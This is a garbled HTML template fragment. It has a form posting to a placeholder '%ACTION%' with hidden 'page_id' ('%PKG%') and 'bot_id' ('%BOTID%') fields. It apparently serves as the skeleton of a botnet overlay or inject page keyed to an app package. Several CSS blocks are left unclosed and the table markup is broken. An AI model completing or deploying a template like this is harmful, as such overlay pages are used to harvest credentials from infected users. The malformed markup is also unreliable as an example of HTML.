<!DOCTYPE html>
<html>

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>

	<style type='text/css'>
	* {
		margin: 0;
		padding: 0;

		color: #818792;
	}
	
	#header {

	.button1 {
		font-weight: bold;
		padding: 20px;
		width: 100%;
		
		color: black;
		background-color: white;
		border: 0;
		border-radius: 5px; 
	}
	
	
	#body {
		width: 100%;
	}
	#body TD {
		padding: 10px;
	}
	
	INPUT {

<script type='text/javascript'>
document.total_steps = 1

</script>

</head>

<body>

	<form id='mainform' method='post' action='%ACTION%'>
		<input type="hidden" name="page_id" value="%PKG%" /><input type="hidden" name="bot_id" value="%BOTID%" />
		
	<table border='0' width='100%' style='margin: 0 auto; margin-bottom: 20px' cellpadding=0 cellspacing=0>

</td></tr>

	</table>

	<table border='0' width='95%' style='margin: 0 auto; margin-top: 30px'>
